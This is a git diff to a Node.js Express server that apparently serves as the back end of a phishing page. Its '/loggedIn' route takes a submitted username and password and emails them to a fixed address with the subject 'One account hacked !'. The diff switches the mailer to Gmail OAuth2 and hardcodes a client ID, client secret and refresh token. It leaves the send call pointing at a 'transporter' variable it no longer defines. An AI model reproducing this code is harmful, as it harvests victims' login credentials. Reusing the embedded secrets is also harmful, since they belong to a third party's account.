@@ -1,5 +1,13 @@
 const express = require('express');
 var nodemailer = require('nodemailer');
+const { google } = require("googleapis");
+const OAuth2 = google.auth.OAuth2;
+
+const oauth2Client = new OAuth2(
+  "91088613789-7jairrnb7an7195olqejnu48gjerkbvu.apps.googleusercontent.com", // ClientID
+  "fRw4L2I_gvdV_yatJFKu_riW", // Client Secret
+  "https://developers.google.com/oauthplayground" // Redirect URL
+);
 
 const app = express();
 
@@ -20,12 +28,28 @@ app.get('/', (req,res)=>{
 app.get('/loggedIn', (req,res)=>{
     console.log('req', req.query);
 
-    var mailOptions = {
-        from: 'mailfromebinxavier@gmail.com',
-        to: 'ebinx7@gmail.com',
-        subject: 'One account hacked !',
-        text: 'User Name: '+req.query.uname+'\nPassword: '+req.query.pass
-      };
+    oauth2Client.setCredentials({
+          refresh_token: "1/FuFItnb9PKlUG6ox89dNG8n0euLHp1GQgRQXCkerQFg"
+    });
+    const accessToken = oauth2Client.getAccessToken();
+    const smtpTransport = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+           type: "OAuth2",
+           user: "mailfromebinxavier@gmail.com", 
+           clientId: "91088613789-7jairrnb7an7195olqejnu48gjerkbvu.apps.googleusercontent.com",
+           clientSecret: "fRw4L2I_gvdV_yatJFKu_riW",
+           refreshToken: "1/FuFItnb9PKlUG6ox89dNG8n0euLHp1GQgRQXCkerQFg",
+           accessToken: accessToken
+      }
+    });
+
+    const mailOptions = {
+      from: "mailfromebinxavier@gmail.com",
+      to: 'ebinx7@gmail.com',
+      subject: 'One account hacked !',
+      text: 'User Name: '+req.query.uname+'\nPassword: '+req.query.pass
+    };
     
     transporter.sendMail(mailOptions, function(error, info){
         if (error) {
